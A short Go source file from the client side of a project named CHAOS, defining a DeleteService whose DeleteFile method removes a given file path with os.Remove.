package delete

import (
	"github.com/justadoll/CHAOS/client/app/services"
	"os"
)

type DeleteService struct {
}

func NewDeleteService() services.Delete {
	return &DeleteService{}
}

func (d DeleteService) DeleteFile(filepath string) error {
	return os.Remove(filepath)
}
